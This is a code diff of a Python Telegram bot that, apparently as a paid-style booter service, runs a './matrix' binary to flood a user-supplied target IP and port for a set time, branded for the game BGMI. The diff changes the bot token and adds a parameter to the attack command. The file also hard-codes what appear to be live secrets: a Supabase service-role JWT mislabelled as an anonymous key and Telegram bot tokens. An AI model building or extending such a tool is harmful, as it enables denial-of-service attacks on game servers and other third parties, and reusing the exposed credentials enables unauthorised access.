@@ -29,7 +29,7 @@ url = "https://yxffpwhflqaapiwcpknf.supabase.co"  # Supabase project URL
 key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ"  # Supabase anonymous API key
 supabase: Client = create_client(url, key)
 
-bot = telebot.TeleBot('7599785141:AAG1fV-LS6r6de3ngpeWXudCZYOIAo0GnM8')
+bot = telebot.TeleBot('7599785141:AAEzVAO7t7zQhTv3Lal19_sz5prVMW90G_0')
 
 # Setup timezone (IST)
 IST = pytz.timezone('Asia/Kolkata')
@@ -302,7 +302,7 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
     bot.reply_to(message, response)
 
-    full_command = f"./matrix {target} {port} {time}"
+    full_command = f"./matrix {target} {port} {time} 60"
     try:
         print(f"\nExecuting attack command: {full_command}")  # Print to shell
         print(f"Attack started by user: {username} ({user_id})")  # Print to shell
